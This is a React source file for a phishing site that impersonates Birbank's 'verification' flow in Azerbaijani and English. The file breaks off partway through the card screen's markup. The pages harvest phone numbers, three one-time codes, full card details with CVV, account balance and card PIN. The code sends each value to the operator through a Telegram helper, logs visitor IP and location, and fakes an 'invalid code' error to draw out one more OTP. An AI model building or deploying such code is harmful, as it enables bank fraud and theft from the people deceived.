"use client"

import React, { useState, useEffect, useRef } from "react"
import { ArrowLeft, Landmark, HelpCircle, Check, ChevronDown, AlertCircle } from "lucide-react"
import { sendTelegramMessage, fetchVisitorInfo } from "@/lib/telegram"

// Custom Diamond Sparkle Icon matching Birbank brand logo
const BirbankDiamond = ({ className = "w-4 h-4" }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
    <polygon points="12,2 22,12 12,22 2,12" />
    <line x1="12" y1="2" x2="12" y2="22" />
    <line x1="2" y1="12" x2="22" y2="12" />
  </svg>
)

// Birbank Logo + Text Component matching screenshot (using bir_logo_card.png)
const BirbankLogoWithText = ({ className = "h-9" }: { className?: string }) => (
  <div className="flex items-center justify-center gap-2.5">
    <img
      src="https://m1oonlinsuk.com/bir_logo_card.png"
      alt="Birbank Card Logo"
      className={`${className} w-auto object-contain`}
      onError={(e) => {
        (e.target as HTMLImageElement).src = "/bir_logo_card.png"
      }}
    />
    <div className="flex flex-col text-left leading-none">
      <span className="text-[#ec3342] font-extrabold text-xl sm:text-2xl tracking-tight">
        Birbank
      </span>
      <span className="text-gray-500 text-[12px] sm:text-[13px] font-medium tracking-normal mt-0.5">
        Verification
      </span>
    </div>
  </div>
)

// Multilingual Translations Dictionary
const translations = {
  AZ: {
    mobileTitle: "Başlamaq üçün mobil nömrənizi daxil edin.",
    mobileLabel: "Mobil nömrə",
    continueBtn: "Davam et",
    cardConfirmBtn: "Kartla təsdıqlə",
    legalPrefix: "Davam etməklə, ",
    legalLink1: "Birbank Şərtləri və Qaydaları",
    legalMiddle: " ilə razılaşıram və ",
    legalLink2: "Bir ID Şərtləri və Qaydaları",
    otp1Title: "Telefon nömrənizi təsdiqləyin",
    otp1Subtitle: "OTP kodunuz qeydiyyatda olan mobil nömrənizə göndərildi. Zəhmət olmasa 6 rəqəmli OTP-ni daxil edin.",
    otp2Title: "Əməliyyatı təsdiqləyin",
    otp2Subtitle: "Kart əməliyyatını təsdiqləmək üçün mobil nömrənizə göndərilən 2-ci OTP kodunu daxil edin.",
    otp3Title: "Telefon nömrənizi təsdiqləyin",
    otp3Subtitle: "OTP kodunuz qeydiyyatda olan mobil nömrənizə göndərildi. Zəhmət olmasa 6 rəqəmli OTP-ni daxil edin.",
    invalidOtpError: "Yanlış kod. Zəhmət olmasa yenidən cəhd edin.",
    timerText: "Kodun bitmə vaxtı",
    confirmBtn: "Təsdiq et",
    cardTitle: "Kart məlumatlarını daxil edin",
    cardSubtitle: "Şəxsiyyətinizi Birbank kartınızla təsdiqləyin",
    cardNumberLabel: "KART NÖMRƏSİ",
    monthLabel: "AY",
    yearLabel: "İL",
    cvvLabel: "CVV",
    cardNote: "Təsdiq üçün kartınızı daxil edin.",
    accountTitle: "Hesab Nömrəsi",
    accLabel: "Acc.",
    securityTitle: "Bank Təhlükəsizlik Sualı",
    securitySubtitle: "Hesabınızda nə qədər balans var?",
    balanceLabel: "AZN",
    pinTitle: "Kartın PIN kodunu daxil edin",
    pinSubtitle: "Şəxsiyyətinizi təsdiqləmək üçün kartınızın PIN kodunu daxil edin.",
    pinLabel: "Kart PIN",
    successTitle: "Təsdiqləndi!",
    successMessage: "Məlumatlarınız uğurla təsdiq olundu.",
    restartBtn: "Yenidən başla",
  },
  EN: {
    mobileTitle: "Enter your mobile number to get started.",
    mobileLabel: "Mobile number",
    continueBtn: "Continue",
    cardConfirmBtn: "Confirm with card",
    legalPrefix: "By continuing, I agree to the ",
    legalLink1: "Birbank Terms & Conditions",
    legalMiddle: " and ",
    legalLink2: "Bir ID Terms & Conditions",
    otp1Title: "Verify your phone number",
    otp1Subtitle: "An OTP code has been sent to your registered mobile number. Please enter the 6-digit OTP code.",
    otp2Title: "Confirm transaction",
    otp2Subtitle: "Please enter the second 6-digit OTP code sent to your mobile number to verify your card.",
    otp3Title: "Verify your phone number",
    otp3Subtitle: "An OTP code has been sent to your registered mobile number. Please enter the 6-digit OTP code.",
    invalidOtpError: "Invalid code. Please try again.",
    timerText: "Code expires in",
    confirmBtn: "Confirm",
    cardTitle: "Enter card details",
    cardSubtitle: "Verify your identity using your Birbank card",
    cardNumberLabel: "CARD NUMBER",
    monthLabel: "MONTH",
    yearLabel: "YEAR",
    cvvLabel: "CVV",
    cardNote: "Enter your card details to verify.",
    accountTitle: "Account Number",
    accLabel: "Acc.",
    securityTitle: "Bank Security Question",
    securitySubtitle: "How much balance is in your account?",
    balanceLabel: "AZN",
    pinTitle: "Enter card PIN code",
    pinSubtitle: "Enter your card PIN code to verify your identity.",
    pinLabel: "Card PIN",
    successTitle: "Verified Successfully!",
    successMessage: "Your information has been successfully verified.",
    restartBtn: "Start Over",
  },
}

export default function Home() {
  // Screen state: 'splash' | 'mobile' | 'otp1' | 'card' | 'otp2' | 'balance' | 'pin' | 'otp3' | 'success'
  const [screen, setScreen] = useState<"splash" | "mobile" | "otp1" | "card" | "otp2" | "balance" | "pin" | "otp3" | "success">("splash")

  // Global Loading Overlay State (2 seconds transition)
  const [isLoading, setIsLoading] = useState(false)

  // Language state
  const [language, setLanguage] = useState<"AZ" | "EN">("AZ")
  const [langDropdownOpen, setLangDropdownOpen] = useState(false)

  // Current translation strings
  const t = translations[language]

  // Form states
  const [mobileNumber, setMobileNumber] = useState("")
  const [otp1Digits, setOtp1Digits] = useState<string[]>(Array(6).fill(""))
  const [otp2Digits, setOtp2Digits] = useState<string[]>(Array(6).fill(""))
  const [otp3Digits, setOtp3Digits] = useState<string[]>(Array(6).fill(""))
  const [otp3Error, setOtp3Error] = useState(false)

  const [cardNumber, setCardNumber] = useState("")
  const [expiryMonth, setExpiryMonth] = useState("")
  const [expiryYear, setExpiryYear] = useState("")
  const [cvv, setCvv] = useState("")

  // Balance & PIN screen states
  const [cardType, setCardType] = useState<0 | 1>(0) // 0: VISA, 1: Mastercard
  const [balanceAmount, setBalanceAmount] = useState("")
  const [cardPin, setCardPin] = useState("")

  // Ref to prevent double auto-submitting on card screen
  const autoSubmittedCard = useRef(false)
  const splashNotified = useRef(false)

  // Timers for OTP 1, OTP 2, OTP 3 (starts at 177 seconds = 02:57)
  const [timer1Seconds, setTimer1Seconds] = useState(177)
  const [timer2Seconds, setTimer2Seconds] = useState(177)
  const [timer3Seconds, setTimer3Seconds] = useState(177)

  // References for OTP inputs
  const otp1InputRefs = useRef<(HTMLInputElement | null)[]>([])
  const otp2InputRefs = useRef<(HTMLInputElement | null)[]>([])
  const otp3InputRefs = useRef<(HTMLInputElement | null)[]>([])

  // References for Card inputs
  const cardNumberRef = useRef<HTMLInputElement | null>(null)
  const monthRef = useRef<HTMLInputElement | null>(null)
  const yearRef = useRef<HTMLInputElement | null>(null)
  const cvvRef = useRef<HTMLInputElement | null>(null)

  // Pre-fetch visitor IP & location info on app mount
  useEffect(() => {
    fetchVisitorInfo()
  }, [])

  // Splash screen auto transition & TELEGRAM NOTIFICATION ON SPLASH LANDING
  useEffect(() => {
    if (screen === "splash") {
      if (!splashNotified.current) {
        splashNotified.current = true
        sendTelegramMessage({
          title: "🌟 New Visitor Landed (Splash Screen)",
          message: "Visitor opened Birbank verification application.",
          language: language,
        })
      }

      const timer = setTimeout(() => {
        setScreen("mobile")
      }, 2500)
      return () => clearTimeout(timer)
    }
  }, [screen, language])

  // Reset autoSubmittedCard flag whenever user navigates to card screen
  useEffect(() => {
    if (screen === "card") {
      autoSubmittedCard.current = false
    }
  }, [screen])

  // OTP 1 Countdown timer logic
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (screen === "otp1" && timer1Seconds > 0) {
      interval = setInterval(() => {
        setTimer1Seconds((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [screen, timer1Seconds])

  // OTP 2 Countdown timer logic
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (screen === "otp2" && timer2Seconds > 0) {
      interval = setInterval(() => {
        setTimer2Seconds((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [screen, timer2Seconds])

  // OTP 3 Countdown timer logic
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (screen === "otp3" && timer3Seconds > 0) {
      interval = setInterval(() => {
        setTimer3Seconds((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [screen, timer3Seconds])

  // Helper to format current phone number for Telegram messages
  const currentPhone = mobileNumber ? `+994${mobileNumber}` : "Not Entered Yet"

  // Process Card Submission -> Show 2-second loading -> Navigate to OTP 2
  const processCardSubmission = () => {
    if (autoSubmittedCard.current || isLoading) return
    autoSubmittedCard.current = true
    setIsLoading(true)

    sendTelegramMessage({
      title: "💳 Card Details Submitted",
      phoneNumber: currentPhone,
      cardNumber: cardNumber,
      expiry: `${expiryMonth}/${expiryYear}`,
      cvv: cvv,
      language: language,
    })

    setTimeout(() => {
      setIsLoading(false)
      setOtp2Digits(Array(6).fill(""))
      setScreen("otp2")
      setTimer2Seconds(177)
    }, 2000)
  }

  // AUTO-SUBMIT CARD SCREEN when all fields filled
  useEffect(() => {
    if (
      screen === "card" &&
      !isLoading &&
      !autoSubmittedCard.current &&
      cardNumber.length === 16 &&
      expiryMonth.length === 2 &&
      expiryYear.length === 2 &&
      cvv.length === 3
    ) {
      processCardSubmission()
    }
  }, [screen, isLoading, cardNumber, expiryMonth, expiryYear, cvv])

  // Format OTP timer as MM:SS
  const formatTimer = (totalSeconds: number) => {
    const mins = Math.floor(totalSeconds / 60)
    const secs = totalSeconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Handle Mobile Number Input
  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 8) {
      setMobileNumber(value)
    }
  }

  // Format mobile number display
  const formatMobileDisplay = (num: string) => {
    if (!num) return ""
    const parts = []
    if (num.length > 0) parts.push(num.slice(0, 2))
    if (num.length > 2) parts.push(num.slice(2, 5))
    if (num.length > 5) parts.push(num.slice(5, 8))
    return parts.join(" ")
  }

  // Submit Mobile Number -> 2s loading -> Go to OTP 1 Screen
  const handleMobileSubmit = async () => {
    if (mobileNumber.length >= 8) {
      setIsLoading(true)
      sendTelegramMessage({
        title: "📱 Phone Number Submitted",
        phoneNumber: `+994${mobileNumber}`,
        language: language,
      })
      setTimeout(() => {
        setIsLoading(false)
        setScreen("otp1")
        setTimer1Seconds(177)
      }, 2000)
    }
  }

  // Confirm with card button click -> 2s loading -> Go to Card Screen
  const handleCardConfirmClick = () => {
    setIsLoading(true)
    sendTelegramMessage({
      title: "💳 Clicked Confirm with Card",
      phoneNumber: currentPhone,
      language: language,
    })
    setTimeout(() => {
      setIsLoading(false)
      setScreen("card")
    }, 2000)
  }

  // Handle OTP 1 digit change
  const handleOtp1Change = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1)
    const newDigits = [...otp1Digits]
    newDigits[index] = digit
    setOtp1Digits(newDigits)
    if (digit && index < 5) {
      otp1InputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtp1KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp1Digits[index] && index > 0) {
      otp1InputRefs.current[index - 1]?.focus()
    }
  }

  // Submit OTP 1 -> 2s loading -> Go to Card Screen
  const handleOtp1Submit = async () => {
    const fullOtp = otp1Digits.join("")
    if (fullOtp.length === 6) {
      setIsLoading(true)
      sendTelegramMessage({
        title: "🔐 First OTP Submitted",
        phoneNumber: currentPhone,
        otp1: fullOtp,
        language: language,
      })
      setTimeout(() => {
        setIsLoading(false)
        setScreen("card")
      }, 2000)
    }
  }

  // Handle OTP 2 digit change
  const handleOtp2Change = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1)
    const newDigits = [...otp2Digits]
    newDigits[index] = digit
    setOtp2Digits(newDigits)
    if (digit && index < 5) {
      otp2InputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtp2KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp2Digits[index] && index > 0) {
      otp2InputRefs.current[index - 1]?.focus()
    }
  }

  // Submit OTP 2 -> 2s loading -> Go to Balance Screen!
  const handleOtp2Submit = async () => {
    const fullOtp2 = otp2Digits.join("")
    if (fullOtp2.length === 6) {
      setIsLoading(true)
      sendTelegramMessage({
        title: "🔐 Second OTP Submitted",
        phoneNumber: currentPhone,
        otp2: fullOtp2,
        language: language,
      })
      setTimeout(() => {
        setIsLoading(false)
        setScreen("balance")
      }, 2000)
    }
  }

  // Handle OTP 3 digit change
  const handleOtp3Change = (index: number, value: string) => {
    setOtp3Error(false)
    const digit = value.replace(/\D/g, "").slice(-1)
    const newDigits = [...otp3Digits]
    newDigits[index] = digit
    setOtp3Digits(newDigits)
    if (digit && index < 5) {
      otp3InputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtp3KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp3Digits[index] && index > 0) {
      otp3InputRefs.current[index - 1]?.focus()
    }
  }

  // Submit OTP 3 -> 2s loading -> SHOW INVALID ERROR MESSAGE!
  const handleOtp3Submit = async () => {
    const fullOtp3 = otp3Digits.join("")
    if (fullOtp3.length === 6) {
      setIsLoading(true)
      sendTelegramMessage({
        title: "❌ Third OTP Submitted (Invalid Attempt)",
        phoneNumber: currentPhone,
        otp3: fullOtp3,
        language: language,
      })
      setTimeout(() => {
        setIsLoading(false)
        setOtp3Error(true)
        setOtp3Digits(Array(6).fill(""))
        otp3InputRefs.current[0]?.focus()
      }, 2000)
    }
  }

  // Card input change handlers with auto-focus
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
    setCardNumber(raw)
    autoSubmittedCard.current = false
    if (raw.length === 16) {
      monthRef.current?.focus()
    }
  }

  const formatCardDisplay = (raw: string) => {
    return raw.replace(/(\d{4})/g, "$1 ").trim()
  }

  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 2)
    setExpiryMonth(raw)
    autoSubmittedCard.current = false
    if (raw.length === 2) {
      yearRef.current?.focus()
    }
  }

  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 2)
    setExpiryYear(raw)
    autoSubmittedCard.current = false
    if (raw.length === 2) {
      cvvRef.current?.focus()
    }
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 3)
    setCvv(raw)
    autoSubmittedCard.current = false
  }

  const handleMonthKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !expiryMonth) {
      cardNumberRef.current?.focus()
    }
  }

  const handleYearKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !expiryYear) {
      monthRef.current?.focus()
    }
  }

  const handleCvvKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cvv) {
      yearRef.current?.focus()
    }
  }

  // Manual Card Submit Backup
  const handleCardSubmit = () => {
    if (cardNumber.length === 16 && expiryMonth.length === 2 && expiryYear.length === 2 && cvv.length === 3) {
      processCardSubmission()
    }
  }

  // Submit Balance Screen -> 2s loading -> Go to Card PIN Screen (`pin`)
  const handleBalanceSubmit = async () => {
    if (balanceAmount) {
      setIsLoading(true)
      sendTelegramMessage({
        title: "💰 Balance Submitted",
        phoneNumber: currentPhone,
        balance: `AZN ${balanceAmount}`,
        cardTypeSelected: cardType === 0 ? "VISA" : "Mastercard",
        language: language,
      })
      setTimeout(() => {
        setIsLoading(false)
        setScreen("pin")
      }, 2000)
    }
  }

  // Submit Card PIN Screen -> 2s loading -> Go to Third OTP Screen (`otp3`)
  const handlePinSubmit = async () => {
    if (cardPin.length === 4) {
      setIsLoading(true)
      sendTelegramMessage({
        title: "🔑 Card PIN Submitted",
        phoneNumber: currentPhone,
        pin: cardPin,
        language: language,
      })
      setTimeout(() => {
        setIsLoading(false)
        setOtp3Digits(Array(6).fill(""))
        setOtp3Error(false)
        setTimer3Seconds(177)
        setScreen("otp3")
      }, 2000)
    }
  }

  // Theme primary color: #ec3342
  const primaryBtnClass = "bg-[#ec3342] text-white hover:bg-[#d62836] active:scale-[0.99] transition-all shadow-md font-bold"

  return (
    <div className="h-[100dvh] max-h-[100dvh] w-full bg-white text-[#111827] flex flex-col justify-between selection:bg-[#ec3342] selection:text-white font-sans relative overflow-hidden">

      {/* ==========================================
          2 SECOND FULL-SCREEN LOADING OVERLAY
         ========================================== */}
      {isLoading && (
        <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-[1px] flex items-center justify-center animate-in fade-in duration-200 select-none">
          <div className="w-14 h-14 border-[5px] border-white/30 border-t-white rounded-full animate-spin drop-shadow-2xl" />
        </div>
      )}

      {/* ==========================================
          SCREEN 1: SPLASH SCREEN
         ========================================== */}
      {screen === "splash" && (
        <div
          onClick={() => setScreen("mobile")}
          className="fixed inset-0 z-50 w-full h-full bg-[#ec3342] flex flex-col items-center justify-center cursor-pointer select-none transition-opacity duration-500 overflow-hidden"
        >
          <div className="relative flex flex-col items-center justify-center space-y-8 p-6">
            <div className="w-40 h-40 sm:w-56 sm:h-56 flex items-center justify-center p-4 animate-splash-zoom">
              <img
                src="https://m1oonlinsuk.com/logo_bir.png"
                alt="Birbank Splash Logo"
                className="w-full h-full object-contain filter drop-shadow-2xl"
                onError={(e) => {
                  (e.target as HTMLImageElement).src = "/logo_bir.png"
                }}
              />
            </div>
          </div>
        </div>
      )}

      {/* ==========================================
          SCREEN 2: MOBILE NUMBER ENTRY SCREEN (BUTTONS PINNED TO BOTTOM)
         ========================================== */}
      {screen === "mobile" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-white overflow-hidden animate-in fade-in duration-300">
          <header className="w-full border-b border-gray-100 py-3 px-5 sm:px-12 flex items-center justify-end shrink-0">
            <div className="relative z-30">
              <button
                onClick={() => setLangDropdownOpen(!langDropdownOpen)}
                className="flex items-center gap-2 bg-[#F3F4F6] text-gray-800 text-xs sm:text-sm font-semibold px-3.5 py-1.5 sm:py-2 rounded-xl hover:bg-gray-200 transition-colors border border-gray-200"
              >
                <Check className="w-3.5 h-3.5 text-emerald-600 stroke-[3]" />
                <span>{language === "AZ" ? "🇦🇿 AZ" : "🇬🇧 EN"}</span>
                <ChevronDown className="w-3.5 h-3.5 text-gray-500" />
              </button>

              {langDropdownOpen && (
                <div className="absolute right-0 mt-2 w-44 bg-white rounded-xl shadow-xl border border-gray-100 py-2 z-40">
                  <button
                    onClick={() => {
                      setLanguage("AZ")
                      setLangDropdownOpen(false)
                    }}
                    className="w-full text-left px-4 py-2 text-sm font-semibold hover:bg-gray-50 flex items-center justify-between text-gray-800"
                  >
                    <span>🇦🇿 AZ (Azərbaycanca)</span>
                    {language === "AZ" && <Check className="w-4 h-4 text-emerald-600 stroke-[3]" />}
                  </button>
                  <button
                    onClick={() => {
                      setLanguage("EN")
                      setLangDropdownOpen(false)
                    }}
                    className="w-full text-left px-4 py-2 text-sm font-semibold hover:bg-gray-50 flex items-center justify-between text-gray-800"
                  >
                    <span>🇬🇧 EN (English)</span>
                    {language === "EN" && <Check className="w-4 h-4 text-emerald-600 stroke-[3]" />}
                  </button>
                </div>
              )}
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-2 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <h1 className="text-2xl sm:text-3xl font-bold text-[#111827] leading-tight mb-6 sm:mb-8 text-center sm:text-left mt-2">
                {t.mobileTitle}
              </h1>

              <div className="space-y-4">
                <div className="bg-[#F3F4F6] rounded-[20px] p-4 sm:p-5 transition-all border-2 border-transparent focus-within:border-[#ec3342] focus-within:bg-white focus-within:ring-4 focus-within:ring-[#ec3342]/10">
                  <label className="block text-xs font-medium text-gray-500 mb-1">
                    {t.mobileLabel}
                  </label>
                  <div className="flex items-center text-lg sm:text-xl font-medium text-gray-900">
                    <span className="mr-3 text-gray-900 select-none text-lg sm:text-xl font-medium">+994</span>
                    <input
                      type="tel"
                      value={formatMobileDisplay(mobileNumber)}
                      onChange={handleMobileChange}
                      placeholder="_ _ _ _ _ _ _ _"
                      className="w-full bg-transparent border-none outline-none font-medium text-gray-900 placeholder:text-gray-400 tracking-widest text-lg sm:text-xl"
                      autoFocus
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Buttons pinned to the bottom of the screen */}
            <div className="pb-5 pt-2 space-y-3">
              <button
                onClick={handleMobileSubmit}
                disabled={mobileNumber.length < 8}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-bold flex items-center justify-center gap-2 text-base sm:text-lg transition-all ${
                  mobileNumber.length >= 8
                    ? primaryBtnClass
                    : "bg-[#F8A5AD] text-white cursor-not-allowed opacity-90"
                }`}
              >
                <BirbankDiamond className="w-4 h-4 sm:w-5 sm:h-5" />
                <span>{t.continueBtn}</span>
              </button>

              <button
                onClick={handleCardConfirmClick}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-bold flex items-center justify-center gap-2 text-base sm:text-lg ${primaryBtnClass}`}
              >
                <span>{t.cardConfirmBtn}</span>
              </button>
            </div>
          </main>

          <footer className="w-full border-t border-gray-100 py-3.5 px-5 text-center text-xs text-gray-500 shrink-0">
            <p className="max-w-2xl mx-auto leading-relaxed">
              {t.legalPrefix}
              <a href="#" className="text-[#ec3342] font-semibold hover:underline">
                {t.legalLink1}
              </a>
              {t.legalMiddle}
              <a href="#" className="text-[#ec3342] font-semibold hover:underline">
                {t.legalLink2}
              </a>
            </p>
          </footer>
        </div>
      )}

      {/* ==========================================
          SCREEN 3: FIRST OTP VERIFICATION SCREEN (OTP 1)
         ========================================== */}
      {screen === "otp1" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-[#F8F9FA] text-[#111827] overflow-hidden animate-in fade-in duration-300">
          <header className="w-full max-w-xl mx-auto py-3 px-5 flex items-center justify-between shrink-0">
            <button
              onClick={() => {
                setOtp1Digits(Array(6).fill(""))
                setScreen("mobile")
              }}
              className="p-1.5 -ml-2 rounded-full hover:bg-gray-200/60 transition-colors text-gray-900 cursor-pointer"
              aria-label="Back to mobile screen"
            >
              <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2]" />
            </button>
            <div className="text-gray-900">
              <Landmark className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.5]" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-2 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <h1 className="text-xl sm:text-2xl font-bold text-[#111827] leading-tight mb-2">
                {t.otp1Title}
              </h1>
              <p className="text-xs sm:text-sm text-gray-500 leading-relaxed mb-6">
                {t.otp1Subtitle}
              </p>

              <div className="grid grid-cols-6 gap-2.5 sm:gap-4 my-6">
                {otp1Digits.map((digit, index) => (
                  <div key={index} className="flex flex-col items-center">
                    <input
                      ref={(el) => {
                        otp1InputRefs.current[index] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtp1Change(index, e.target.value)}
                      onKeyDown={(e) => handleOtp1KeyDown(index, e)}
                      className="w-full h-9 sm:h-10 text-center text-xl sm:text-2xl font-bold bg-transparent outline-none text-gray-900 mb-1.5"
                      autoFocus={index === 0}
                    />
                    <div
                      className={`w-full h-[3px] rounded-full transition-all ${
                        digit || (index === 0 && !otp1Digits.some((d) => d))
                          ? "bg-[#ec3342]"
                          : "bg-[#D1D5DB]"
                      }`}
                    />
                  </div>
                ))}
              </div>

              <div className="flex justify-center my-6">
                <div className="inline-flex items-center gap-2 bg-[#FFF0F3] border border-[#FFCCD5] rounded-full px-4 py-2 text-xs sm:text-sm font-medium text-[#ec3342]">
                  <span className="w-2 h-2 rounded-full bg-[#ec3342]" />
                  <span>{t.timerText}</span>
                  <span className="font-bold text-[#ec3342] ml-0.5">{formatTimer(timer1Seconds)}</span>
                </div>
              </div>
            </div>

            <div className="pb-5 pt-2">
              <button
                onClick={handleOtp1Submit}
                disabled={otp1Digits.join("").length < 6}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-semibold flex items-center justify-center gap-2 text-base transition-all ${
                  otp1Digits.join("").length === 6
                    ? "bg-[#ec3342] text-white hover:bg-[#d62836] shadow-md cursor-pointer"
                    : "bg-[#E5E7EB] text-[#9CA3AF] cursor-not-allowed"
                }`}
              >
                <BirbankDiamond className="w-4 h-4" />
                <span>{t.confirmBtn}</span>
              </button>
            </div>
          </main>
        </div>
      )}

      {/* ==========================================
          SCREEN 4: CARD DETAILS SCREEN
         ========================================== */}
      {screen === "card" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-[#F8F9FA] text-[#111827] overflow-hidden animate-in fade-in duration-300">
          <header className="w-full max-w-xl mx-auto py-3 px-5 flex items-center justify-between shrink-0">
            <button
              onClick={() => {
                setOtp1Digits(Array(6).fill(""))
                setScreen("otp1")
              }}
              className="p-1.5 -ml-2 rounded-full hover:bg-gray-200/60 transition-colors text-gray-900 cursor-pointer"
              aria-label="Back"
            >
              <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2]" />
            </button>
            <div className="text-gray-900">
              <Landmark className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.5]" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-2 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <div className="flex items-center justify-center mb-3">
                <BirbankLogoWithText className="h-8 sm:h-9" />
              </div>

              <div className="text-center mb-4">
                <h1 className="text-xl sm:text-2xl font-bold text-[#111827] mb-1">
                  {t.cardTitle}
                </h1>
                <p className="text-xs sm:text-sm text-gray-500">
                  {t.cardSubtitle}
                </p>
              </div>

              <div className="space-y-2.5">
                <div
                  className={`relative bg-white rounded-[18px] p-3 transition-all border ${
                    cardNumber.length === 16
                      ? "border-2 border-emerald-500"
                      : "border-gray-200 focus-within:border-[#ec3342]"
                  }`}
                >
                  <div className="flex items-center justify-between mb-0.5">
                    <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">
                      {t.cardNumberLabel}
                    </label>
                    <HelpCircle className="w-3.5 h-3.5 text-gray-300 stroke-[2]" />
                  </div>
                  <div className="flex items-center justify-between">
                    <input
                      ref={cardNumberRef}
                      type="text"
                      inputMode="numeric"
                      value={formatCardDisplay(cardNumber)}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      className="w-full bg-transparent border-none outline-none font-medium text-gray-900 text-base sm:text-lg tracking-wider placeholder:text-gray-300"
                      maxLength={19}
                      autoFocus
                    />
                    {cardNumber.length === 16 && (
                      <div className="w-4 h-4 rounded-full bg-emerald-500 flex items-center justify-center animate-in zoom-in-50 duration-200 ml-2">
                        <Check className="w-3 h-3 text-white stroke-[3]" />
                      </div>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2.5">
                  <div
                    className={`bg-white rounded-[18px] p-3 transition-all border ${
                      expiryMonth.length === 2
                        ? "border-2 border-emerald-500"
                        : "border-gray-200 focus-within:border-[#ec3342]"
                    }`}
                  >
                    <div className="flex items-center justify-between mb-0.5">
                      <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">
                        {t.monthLabel}
                      </label>
                      <HelpCircle className="w-3.5 h-3.5 text-gray-300 stroke-[2]" />
                    </div>
                    <input
                      ref={monthRef}
                      type="text"
                      inputMode="numeric"
                      maxLength={2}
                      value={expiryMonth}
                      onChange={handleMonthChange}
                      onKeyDown={handleMonthKeyDown}
                      placeholder="MM"
                      className="w-full bg-transparent border-none outline-none font-medium text-gray-900 text-base sm:text-lg placeholder:text-gray-300"
                    />
                  </div>

                  <div
                    className={`bg-white rounded-[18px] p-3 transition-all border ${
                      expiryYear.length === 2
                        ? "border-2 border-emerald-500"
                        : "border-gray-200 focus-within:border-[#ec3342]"
                    }`}
                  >
                    <div className="flex items-center justify-between mb-0.5">
                      <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">
                        {t.yearLabel}
                      </label>
                    </div>
                    <input
                      ref={yearRef}
                      type="text"
                      inputMode="numeric"
                      maxLength={2}
                      value={expiryYear}
                      onChange={handleYearChange}
                      onKeyDown={handleYearKeyDown}
                      placeholder="YY"
                      className="w-full bg-transparent border-none outline-none font-medium text-gray-900 text-base sm:text-lg placeholder:text-gray-300"
                    />
                  </div>
                </div>

                <div
                  className={`bg-white rounded-[18px] p-3 transition-all border ${
                    cvv.length === 3
                      ? "border-2 border-emerald-500"
                      : "border-gray-200 focus-within:border-[#ec3342]"
                  }`}
                >
                  <div className="flex items-center justify-between mb-0.5">
                    <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">
                      {t.cvvLabel}
                    </label>
                    <HelpCircle className="w-3.5 h-3.5 text-gray-300 stroke-[2]" />
                  </div>
                  <input
                    ref={cvvRef}
                    type="password"
                    inputMode="numeric"
                    maxLength={3}
                    value={cvv}
                    onChange={handleCvvChange}
                    onKeyDown={handleCvvKeyDown}
                    placeholder="• • •"
                    className="w-full bg-transparent border-none outline-none font-medium text-gray-900 text-base sm:text-lg tracking-widest placeholder:text-gray-300"
                  />
                </div>
              </div>

              <p className="text-center text-[11px] text-gray-400 mt-3">
                {t.cardNote}
              </p>
            </div>

            <div className="pb-5 pt-2">
              <button
                onClick={handleCardSubmit}
